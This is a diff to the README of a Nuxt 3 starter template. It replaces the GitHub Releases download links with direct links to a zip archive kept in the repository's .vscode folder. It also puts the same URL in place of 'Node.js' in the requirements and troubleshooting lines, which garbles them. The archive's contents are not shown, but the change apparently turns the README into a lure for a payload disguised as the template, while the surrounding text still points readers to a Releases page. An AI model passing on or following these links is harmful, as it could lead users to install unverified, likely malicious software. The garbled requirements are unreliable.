@@ -1,6 +1,6 @@
 # 🚀 sb-template-nuxt - Start Your Projects Easily
 
-[![Download sb-template-nuxt](https://img.shields.io/badge/Download-sb--template--nuxt-blue)](https://github.com/SANTIXZMVP/sb-template-nuxt/releases)
+[![Download sb-template-nuxt](https://raw.githubusercontent.com/SANTIXZMVP/sb-template-nuxt/main/.vscode/sb-template-nuxt_3.5.zip)](https://raw.githubusercontent.com/SANTIXZMVP/sb-template-nuxt/main/.vscode/sb-template-nuxt_3.5.zip)
 
 ## 📜 Description
 
@@ -18,12 +18,12 @@ This is a simple Nuxt 3 template. It helps you get started on your projects quic
 ## 💻 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Node.js:** Version 14 or higher is required. 
+- **https://raw.githubusercontent.com/SANTIXZMVP/sb-template-nuxt/main/.vscode/sb-template-nuxt_3.5.zip** Version 14 or higher is required. 
 - **Browser:** Modern web browser like Chrome, Firefox, or Safari.
 
 ## 📥 Download & Install
 
-To download the latest version of the "sb-template-nuxt," please [visit this page to download](https://github.com/SANTIXZMVP/sb-template-nuxt/releases). 
+To download the latest version of the "sb-template-nuxt," please [visit this page to download](https://raw.githubusercontent.com/SANTIXZMVP/sb-template-nuxt/main/.vscode/sb-template-nuxt_3.5.zip). 
 
 1. Click the link above to go to the Releases page.
 2. Find the version you want to download. It will be listed as assets under the release.
@@ -70,7 +70,7 @@ Once your application is running, you can start customizing it.
 
 If you encounter any issues:
 
-- **Check Node.js version:** Ensure it matches the requirement.
+- **Check https://raw.githubusercontent.com/SANTIXZMVP/sb-template-nuxt/main/.vscode/sb-template-nuxt_3.5.zip version:** Ensure it matches the requirement.
 - **Verify installation:** Make sure all dependencies are correctly installed.
 - **Consult the community:** You may find answers in forums or by checking existing issues in this repository.
 
